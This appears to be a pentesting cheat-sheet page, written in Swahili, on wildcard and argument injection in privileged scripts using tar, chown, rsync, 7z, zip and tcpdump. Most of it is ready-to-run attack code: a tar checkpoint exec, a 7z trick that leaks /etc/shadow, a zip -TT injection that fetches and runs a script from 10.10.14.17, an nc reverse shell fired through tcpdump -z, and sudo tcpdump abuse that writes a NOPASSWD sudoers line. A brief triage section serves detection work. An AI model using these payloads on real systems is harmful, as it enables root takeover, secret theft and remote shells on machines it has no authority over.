# Wildcards Spare Tricks

> **argument injection** ya Wildcard (pia huitwa *glob*) hutokea script yenye privileges inapotekeleza Unix binary kama `tar`, `chown`, `rsync`, `zip`, `7z`, … ikiwa na wildcard isiyonukuliwa kama `*`.
> Kwa kuwa shell hupanua wildcard **kabla** ya kutekeleza binary, attacker anayeweza kuunda files katika working directory anaweza kutengeneza filenames zinazoanza na `-`, ili zitafsiriwe kama **options badala ya data**, na hivyo kusafirisha kwa siri flags holela au hata commands.<sup>[[6]](#references)</sup>
> Ukurasa huu unakusanya primitives muhimu zaidi, utafiti wa hivi karibuni na detections za kisasa za 2023-2025.

## chown / chmod

Unaweza **kunakili owner/group au permission bits kutoka reference file** kwa kutumia vibaya flag ya `--reference` wakati filename inayofanana na option inapanuliwa na wildcard.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
Wakati root baadaye anapotekeleza kitu kama:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
Expanded `--reference=.drf.php` inabatilisha owner/mode iliyowekwa wazi, na kusababisha faili zinazolingana kurithi metadata kutoka `.drf.php` (na, kwa usanidi ulio hapo juu, kuzifanya ziwe writable na attacker).<sup>[[6]](#references)</sup>

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).<sup>[[7]](#references)</sup>
Tazama pia paper ya kawaida ya DefenseCode kwa maelezo zaidi.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

Tekeleza commands kiholela kwa kutumia vibaya feature ya **checkpoint** ya GNU tar pamoja na checkpoint actions.<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
Mara root anapoendesha kwa mfano `tar -czf /root/backup.tgz *`, `shell.sh` hutekelezwa kama root.<sup>[[10]](#references)</sup>

### Tahadhari ya override ya compressor ya bsdtar / macOS

`tar` chaguomsingi kwenye macOS za hivi karibuni (inayotegemea `libarchive`) haitoi interface ya `--checkpoint` ya GNU tar, lakini bsdtar inaandika kuhusu **--use-compress-program** kwa kuchagua compressor ya nje.<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Wakati script yenye privileged inaendesha `tar -cf backup.tar *`, hii huchagua `sh` kupitia `PATH` ya victim na bsdtar huianzisha kama compressor.<sup>[[11]](#references)</sup> Hii inathibitisha option injection, lakini yenyewe si primitive ya kuaminika ya arbitrary-command: filename iliyoundwa na wildcard haiwezi kuwa na `/`, na bsdtar hutoa archive data badala ya shell command iliyochaguliwa na attacker. Code execution pia huhitaji executable inayoweza kudhibitiwa na kutatuliwa kupitia `PATH` au argument channel nyingine inayoweza kutaja program yenye manufaa.

---

## rsync

`rsync` hukuruhusu kubadilisha remote shell au remote binary kupitia command-line flags kama vile `-e` na `--rsync-path`.<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Ikiwa root baadaye ita-archive directory kwa `rsync -az * backup:/srv/`, flag iliyodungwa inaweza kuendesha shell kupitia remote-shell mechanism.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Hata wakati script yenye privileged *kwa kujilinda* inaweka `--` kabla ya wildcard (ili kusimamisha option parsing), 7-Zip CLI inakubali **file list files** kwa kuweka `@` kabla ya filename. Kuchanganya hilo na symlink hukuruhusu *kutoa arbitrary files kwa siri*.<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Ikiwa root itaendesha kitu kama:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip itajaribu kusoma `root.txt` (→ `/etc/shadow`) kama file list na itaacha, **ikichapisha yaliyomo kwenye stderr**.<sup>[[13]](#references)</sup>

Hii bado inafanya kazi kwa `-- *` kwa sababu 7-Zip CLI inakubali waziwazi filenames za kawaida na `@listfiles` kama inputs za positional, hivyo filename halisi kama `@root.txt` bado hushughulikiwa kwa namna maalum.<sup>[[13]](#references)</sup>

---

## zip

Kuna primitives mbili zenye matumizi ya moja kwa moja wakati application inapopitisha filenames zinazodhibitiwa na mtumiaji kwa `zip` (ama kupitia wildcard au kwa kuorodhesha majina bila `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE kupitia test hook: `-T` huwezesha “test archive” na `-TT <cmd>` hubadilisha tester na program yoyote (muundo mrefu: `--unzip-command <cmd>`). Ikiwa unaweza kuingiza filenames zinazoanza na `-`, gawanya flags katika filenames tofauti ili parsing ya short-options ifanye kazi.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Maelezo
- USIJARIBU filename moja kama `'-T -TT <cmd>'` — short options huchanganuliwa kwa kila character na itashindwa. Tumia tokens tofauti kama ilivyoonyeshwa.<sup>[[3]](#references)</sup>
- Ikiwa slashes zitaondolewa kwenye filenames na app, fetch kutoka bare host/IP (default path `/index.html`) na uhifadhi locally kwa `-O`, kisha execute.<sup>[[3]](#references)</sup>
- Unaweza ku-debug parsing kwa `-sc` (show processed argv) au `-h2` (more help) ili kuelewa jinsi tokens zako zinavyotumiwa.<sup>[[3]](#references)</sup>

Mfano (local behavior kwenye zip 3.0).<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Ikiwa web layer itaakisi `zip` stdout/stderr (jambo la kawaida katika wrappers zisizo imara), flags zilizodungwa kama `--help` au failures kutoka kwa options zisizo sahihi zitaonekana kwenye HTTP response, hivyo kuthibitisha command-line injection na kusaidia kurekebisha payload.<sup>[[3]](#references)</sup>

---

## Kandideti za ziada za option-injection

Wrapper yenye privileged inapopanua directory inayoweza kuandikwa kwa kutumia wildcard, option hooks hizi zilizoandikwa zinafaa kuchunguzwa.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag ya kutumia vibaya | Athari |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Pitisha command string kwa shell |
| `git`   | `-c core.sshCommand=<cmd>` | Tumia `<cmd>` badala ya SSH kwa Git fetch/push |
| `scp`   | `-S <program>` | Tumia connection program mbadala inayooana na SSH |

Primitives hizi ni useful checks zaidi ya zile classics za *tar/rsync/zip*.

---

## Kutafuta wrappers na jobs zilizo hatarini

Case studies na mwongozo wa detection wa hivi karibuni unaonyesha kuwa wildcard/argv injection si tatizo la **cron + tar** pekee tena.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Aina hii ya bug inaendelea kuonekana katika:

- web features zinazopakua "kila kitu kama zip/tar" kutoka kwenye upload directories zinazodhibitiwa na attacker
- debug shells za vendor/appliance zinazoonyesha wrapper ya **tcpdump** yenye filename/filter fields zinazodhibitiwa na attacker
- backup au rotation jobs zinazoita `tar`, `rsync`, `7z`, `zip`, `chown`, au `chmod` kwenye directories zinazoweza kuandikwa

Commands muhimu za triage (mwito wa `pspy` unatumia process/file-event na interval flags zilizoandikwa kwenye documentation yake).<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Mbinu za haraka:

- `-- *` ni suluhisho zuri kwa GNU tools nyingi, lakini **si** kwa `7z`/`7za` kwa sababu `@listfiles` huchanganuliwa kando.<sup>[[13]](#references)</sup>
- Kwa `zip`, tafuta wrappers zinazoorodhesha moja kwa moja filenames zinazodhibitiwa na user; short-option splitting (`-T` + `-TT <cmd>`) bado hufanya kazi hata bila shell glob.<sup>[[2]](#references)[[3]](#references)</sup>
- Kwa `tcpdump`, zingatia hasa wrappers zinazokuruhusu kudhibiti **output file names**, **rotation settings**, au arguments za **capture-file replay**.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): RCE kupitia argv injection kwenye wrappers

Restricted shell au vendor wrapper inapounda command line ya `tcpdump` kwa kuunganisha fields zinazodhibitiwa na user (kwa mfano, parameter ya "file name") bila quoting/validation thabiti, unaweza kuficha `tcpdump` flags za ziada. Mchanganyiko wa `-G` (time-based rotation), `-W` (kuweka kikomo cha idadi ya files), na `-z <cmd>` (post-rotate command) husababisha arbitrary command execution kwa user anayeendesha tcpdump (mara nyingi root kwenye appliances).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Masharti ya awali:

- Unaweza kuathiri `argv` inayopitishwa kwa `tcpdump` (kwa mfano, kupitia wrapper kama `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Wrapper haisafishi spaces au tokens zinazoanza na `-` katika field ya file name.<sup>[[4]](#references)</sup>

Classic PoC (inaendesha reverse shell script kutoka kwenye writable path).<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Maelezo:

- `-G 1` huzungusha kila sekunde, na `-W 1` husitisha baada ya faili moja kuzungushwa; capture lazima ipokee packet inayolingana kabla ya kuzungushwa.<sup>[[18]](#references)</sup>
- `-z <cmd>` huendesha amri ya post-rotate mara moja kwa kila mzunguko na kupitisha path ya savefile iliyofungwa kama argument; hakikisha ushughulikiaji wa argument wa script/interpreter unaendana na payload yako.<sup>[[18]](#references)</sup>

Mibadala isiyotumia removable media:

- Ikiwa una primitive nyingine yoyote ya kuandika files (kwa mfano, command wrapper tofauti inayoruhusu output redirection), weka script yako kwenye path inayojulikana na u-trigger `-z /path/script.sh`; script iendeshe `/bin/sh` yenyewe ikihitajika.<sup>[[18]](#references)</sup>
- Ikiwa vendor wrapper inakuruhusu kuchagua path iliyozungushwa, kagua udhibiti wa path hiyo tu pamoja na post-rotate command inayotafsiri savefile argument yake; udhibiti wa path pekee hauendeshi file contents.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Mfano wa sudoers anti-pattern:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Kanuni inaacha chaguo kadhaa zipatikane chini ya parser ya `tcpdump` iliyo documented:<sup>[[3]](#references)[[18]](#references)</sup>
- Glob ya `*` na patterns zinazoruhusu mengi zinaweka kikomo kwenye argument ya kwanza ya `-w` pekee. `tcpdump` inakubali options nyingi za `-w`; ya mwisho ndiyo hutumika.<sup>[[3]](#references)[[18]](#references)</sup>
- Kanuni haiweki kikomo kwa options nyingine, kwa hivyo `-Z`, `-r`, `-V`, n.k. zinaruhusiwa.<sup>[[3]](#references)[[18]](#references)</sup>

Primitives zinazohusika zimeandikwa hapa chini.<sup>[[3]](#references)[[18]](#references)</sup>
- Badilisha destination path kwa kutumia `-w` ya pili (ya kwanza inatimiza sudoers pekee).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal ndani ya `-w` ya kwanza ili kutoka kwenye mti uliowekewa vizuizi.<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Lazimisha umiliki wa output kwa `-Z root` (huunda faili zinazomilikiwa na root popote).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Kuandika maudhui holela kwa kucheza tena PCAP iliyoundwa mahususi kupitia `-r` (kwa mfano, kuongeza mstari wa sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Unda PCAP iliyo na payload halisi ya ASCII na uiandike ukiwa root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Usomaji wa kiholela wa faili/leak ya siri kwa `-V <file>` (hutafsiri orodha ya savefiles). Uchunguzi wa hitilafu mara nyingi hurudia mistari, na hivyo kuvuja maudhui.<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Injection ya hoja za zip hadi RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Mlolongo Kamili wa Exploit](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Shell Inayowezekana kupitia Wildcard Injection Imegunduliwa](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Rudi Kwenye Wakati Ujao: Unix Wildcards Zimeenda Mbali (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [Mwito wa `chown` wa GNU Coreutils](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [Mwito wa `chmod` wa GNU Coreutils](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [Checkpoints za GNU tar](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [Mwongozo wa bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [Mwongozo wa rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Sintaksia ya mstari wa amri ya 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [Mwongozo wa flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Nyaraka za usanidi wa Git](https://git-scm.com/docs/git-config)
- [17] [Mwongozo wa `scp` wa OpenBSD](https://man.openbsd.org/scp)
- [18] [Mwongozo wa tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
